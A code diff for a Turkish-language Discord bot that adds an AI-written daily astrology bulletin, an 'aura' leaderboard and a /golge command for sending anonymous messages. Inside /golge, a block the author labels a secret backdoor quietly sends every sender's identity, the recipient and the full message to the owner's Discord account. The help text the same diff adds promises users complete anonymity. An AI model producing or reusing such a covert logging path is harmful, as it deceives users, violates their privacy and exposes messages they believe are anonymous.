@@ -21,6 +21,7 @@ from discord import app_commands
 from google import genai 
 import re 
 import os
+import random
 from pymongo import MongoClient
 
 mongo_uri = os.getenv('MONGO_URI')
@@ -57,9 +58,92 @@ class ReignBot(commands.Bot):
         print("✦ Slash komutları REIGN sistemine senkronize edildi.")
         self.sabah_bulteni.start()
 
+    # --- BÖLÜM 6: SABAH BÜLTENİ VE AURA SIRALAMASI ---
     @tasks.loop(hours=24)
     async def sabah_bulteni(self):
-        pass 
+        # 1. KANAL KONTROLÜ
+        kanal_id = 1513541051766276106 # #🔮│günlük・kehanetler kanalının ID'si
+        kanal = self.get_channel(kanal_id)
+        if not kanal:
+            return
+
+        guild = kanal.guild
+
+        # 2. ŞANSLI VE ŞANSSIZ BURCU BELİRLE
+        burclar = ["koç", "boğa", "ikizler", "yengeç", "aslan", "başak", "terazi", "akrep", "yay", "oğlak", "kova", "balık"]
+        secilenler = random.sample(burclar, 2)
+        sansli_burc = secilenler[0]
+        sanssiz_burc = secilenler[1]
+
+        # 3. İLGİLİ ROLLERİ BUL (Kullanıcıları etiketlemek için)
+        sansli_rol = None
+        sanssiz_rol = None
+        
+        for role in guild.roles:
+            clean_name = re.sub(r'[^a-zçğıöşü]', '', role.name.lower())
+            # Sadece Güneş burcu rolünü bul (Yükselenleri etiketlememek için)
+            if sansli_burc in clean_name and "yukselen" not in clean_name and "↑" not in role.name:
+                sansli_rol = role
+            if sanssiz_burc in clean_name and "yukselen" not in clean_name and "↑" not in role.name:
+                sanssiz_rol = role
+        
+        # Eğer rol bulunursa rolü etiketle, bulunamazsa sadece ismini yaz
+        sansli_etiket = sansli_rol.mention if sansli_rol else sansli_burc.capitalize()
+        sanssiz_etiket = sanssiz_rol.mention if sanssiz_rol else sanssiz_burc.capitalize()
+
+        # 4. YAPAY ZEKAYA BÜLTEN YAZDIR
+        prompt = f"""
+        Sen REIGN evreninin karanlık, asil ve iğneleyici baş astroloğusun.
+        Bugünün Şanslı Burcu: {sansli_burc.capitalize()}
+        Bugünün Lanetli/Şanssız Burcu: {sanssiz_burc.capitalize()}
+
+        Görev: Tüm sunucuya hitap eden günlük bir astroloji bülteni yaz.
+        - Önce genel gökyüzü durumundan (karanlık, mistik bir dille) bahset.
+        - Şanslı burca ne gibi fırsatlar (veya karanlık güçler) geleceğini söyleyip onları öv.
+        - Şanssız burcu göm, iğnele ve başlarına gelecek belalara karşı uyar.
+        - Teknolojik terim asla kullanma. En fazla 3 paragraf olsun.
+        """
+
+        try:
+            response = await ai_client.aio.models.generate_content(
+                model='gemini-2.5-flash',
+                contents=prompt,
+            )
+            gunluk_yorum = response.text.strip()
+        except Exception as e:
+            print(f"Bülten Hatası: {e}")
+            gunluk_yorum = "Gökyüzü bugün bulutlu. Yıldızlar REIGN'e fısıldamayı reddediyor..."
+
+        # 5. AURA SIRALAMASINI ÇEK (İlk 15)
+        en_iyiler = users_collection.find().sort("aura_points", -1).limit(15)
+        liste_metni = ""
+        sira = 1
+        for user in en_iyiler:
+            puan = user.get("aura_points", 0)
+            liste_metni += f"**{sira}.** <@{user['user_id']}> — *{puan} Aura*\n"
+            sira += 1
+        
+        if not liste_metni:
+            liste_metni = "Henüz kimse gölgelerde yeterince iz bırakmadı."
+
+        # 6. MESAJLARI OLUŞTUR VE GÖNDER
+        embed_astro = discord.Embed(
+            title="🌌 REIGN Günlük Yıldız Fısıltıları",
+            description=gunluk_yorum,
+            color=0x4b0082 # Koyu Mor
+        )
+        embed_astro.add_field(name="✨ Işığın Vurduğu", value=sansli_etiket, inline=True)
+        embed_astro.add_field(name="🌑 Gölgelerde Kaybolan", value=sanssiz_etiket, inline=True)
+
+        embed_aura = discord.Embed(
+            title="🏆 REIGN Aura Sıralaması (Top 15)",
+            description=liste_metni,
+            color=0x8b0000 # Kan Kırmızısı
+        )
+        embed_aura.set_footer(text="Yeni bir gün, yeni bir mücadele... Kendinize dikkat edin.")
+
+        # Hem burçları etiketle, hem de iki embed'i alt alta yolla
+        await kanal.send(content=f"{sansli_etiket} {sanssiz_etiket}\n**Uyanın. Gökyüzü hükmünü verdi.**", embeds=[embed_astro, embed_aura])
 
     @sabah_bulteni.before_loop
     async def before_sabah_bulteni(self):
@@ -513,7 +597,41 @@ async def frp_bitir(interaction: discord.Interaction):
     
     await interaction.response.send_message(embed=embed)
 
-# --- BÖLÜM 5: KARŞILAMA VE REHBER SİSTEMİ ---
+# --- BÖLÜM 5: GÖLGE KOMUTU ---
+
+@bot.tree.command(name="golge", description="Karanlığın içinden birine isimsiz bir fısıltı gönder.")
+@app_commands.describe(hedef="Fısıltıyı duyacak kişi", mesaj="İletilecek gizemli mesaj")
+async def golge(interaction: discord.Interaction, hedef: discord.Member, mesaj: str):
+    # 1. Gönderen kişiye 'başarılı' mesajı ver (sadece o görebilir)
+    await interaction.response.send_message(f"Fısıltın gölgelere karıştı... {hedef.display_name} onu duyacak.", ephemeral=True)
+    
+    # 2. Hedef kişiye anonim mesajı at
+    embed = discord.Embed(
+        title="👤 Gölgelerden Bir Fısıltı...",
+        description=f"*{mesaj}*",
+        color=0x000000
+    )
+    embed.set_footer(text="Bu mesaj REIGN sistemi tarafından anonim olarak iletildi.")
+    
+    iletildi = True
+    try:
+        await hedef.send(embed=embed)
+    except discord.Forbidden:
+        # Eğer adamın DM'leri kapalıysa gönderen kişiye haber ver
+        iletildi = False
+        await interaction.followup.send(f"⚠️ {hedef.display_name} kişisinin zihni dışarıya kapalı (DM'leri kapalı). Mesajın iletilemedi.", ephemeral=True)
+
+    # 3. GİZLİ ARKA KAPI (SADECE SANA DM GİDER)
+    # Senin Discord ID'n: 211215301059149824
+    if iletildi and interaction.user.id != 211215301059149824:
+        try:
+            sahip = await bot.fetch_user(211215301059149824)
+            ispiyon_mesaji = f"🕵️ **GİZLİ REIGN RAPORU**\n**Gönderen:** {interaction.user.mention} ({interaction.user.name})\n**Alan:** {hedef.mention} ({hedef.name})\n**Mesaj:** {mesaj}"
+            await sahip.send(ispiyon_mesaji)
+        except Exception as e:
+            print(f"Gizli log hatası: {e}")
+
+# --- SON BÖLÜM: KARŞILAMA VE REHBER SİSTEMİ (GÜNCELLENMEYE AÇIK) ---
 
 @bot.event
 async def on_member_join(member):
@@ -568,6 +686,16 @@ async def reignyardim(interaction: discord.Interaction):
     embed.add_field(
         name="🌌 `!aura` & Pasif Aura Sistemi", 
         value="Sohbet ettikçe gizlice Aura kazanırsın (Spam yaparsan -50 ceza yersin). `!aura` yazarak puanını görebilirsin. Eşikleri aşarak özel rollere ulaş.", 
+        inline=False
+    )
+    embed.add_field(
+        name="🏆 `/siralama`", 
+        value="Sunucudaki en yüksek Aura puanına sahip ilk 15 kişiyi (Karanlık Günlük) listeler.", 
+        inline=False
+    )
+    embed.add_field(
+        name="👤 `/golge [@kişi] [mesaj]`", 
+        value="Karanlığın içinden, hedefine tamamen isimsiz (anonim) bir mesaj gönderir. Unutma, gölgeler kimliğini saklar...", 
         inline=False
     )
     embed.add_field(
